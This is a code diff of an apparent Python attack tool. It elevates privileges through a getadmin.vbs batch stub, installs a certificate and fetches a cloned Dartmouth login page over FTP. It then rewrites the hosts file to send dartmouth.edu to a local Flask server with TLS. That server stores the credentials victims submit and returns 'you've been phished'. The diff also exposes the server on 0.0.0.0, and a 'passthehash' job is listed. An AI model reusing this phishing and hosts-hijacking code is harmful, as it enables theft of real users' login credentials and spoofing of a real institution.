@@ -586,23 +586,26 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
         add_certificate('cert.pem')
         my_print('certificate added')
 
-        my_print('downloading webpage files...')
+        my_print('ensuring webpage files are downloaded...')
         ftp_dl(ftp, 'Login.html')
         # more files are needed for the page to work properly, download them
         MORE_FILES_DIR = 'Login_files'
         s = ftp.cwd(MORE_FILES_DIR)
         filenames = ftp.nlst() # get filenames within the directory
-        my_print(f'got files {filenames}')
+        my_print(f'got list of files: {filenames}')
         for filename in filenames:
-            print(os.path.join(MORE_FILES_DIR, filename))
-            if not os.path.join(MORE_FILES_DIR, filename):
+            if not os.path.isfile(os.path.join(MORE_FILES_DIR, filename)):
+                my_print('downloading ' + os.path.join(MORE_FILES_DIR, filename))
                 ftp_dl(ftp, filename, os.path.join(MORE_FILES_DIR, filename))
+            else:
+                my_print('file present: ' + os.path.join(MORE_FILES_DIR, filename))
 
         close_ftp_connection(ftp)
 
         my_print('starting web server')
 
-        remote_url = 'apply.dartmouth.edu'
+        # https://apply.dartmouth.edu/account/login?r=https%3a%2f%2fapply.dartmouth.edu%2fapply%2fstatus&cookie=1
+        remote_url = 'dartmouth.edu'
 
         found = False
         with open(HOSTS_PATH, 'r') as hosts_file:
@@ -613,25 +616,17 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
         if not found:
             with open(HOSTS_PATH, 'a') as hosts_file:
-                hosts_file.write(f'127.0.0.1 {remote_url}')
-                hosts_file.write(f'127.0.0.1 https://{remote_url}')
+                hosts_file.write(f'\n127.0.0.1 {remote_url}\n')
+                hosts_file.write(f'\n127.0.0.1 https://{remote_url}\n')
             my_print('added an entry to the hosts file')
 
         app = flask.Flask(__name__, static_folder='./', static_url_path='')
 
-        @app.route("/")
-        def index():
-            return flask.send_file('Login.html')
-
-        @app.route("/", methods=['POST', 'GET'])
-        def send_report():
-            return login_page()
-
-        @app.route("/account/Login_files/<path:path>")
+        @app.route("/Login_files/<path:path>")
         def login_files(path):
             return send_from_directory('Login_files', path)
 
-        @app.route("/account/login", methods=['POST', 'GET'])
+        @app.route("/", methods=['POST', 'GET'])
         def login_page():
             if request.method == 'GET':
                 return send_from_directory('./', 'Login.html')
@@ -647,6 +642,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
                 con.commit()
                 return "<h>you've been phished</h>"
 
-        app.run(ssl_context=('cert.pem', 'key.pem'), host='127.0.0.1', port=80)
+        app.run(ssl_context=('cert.pem', 'key.pem'), host='0.0.0.0', port=80)
+        # https://dartmouth.edu:80
     elif job == 'passthehash':
         passthehash()
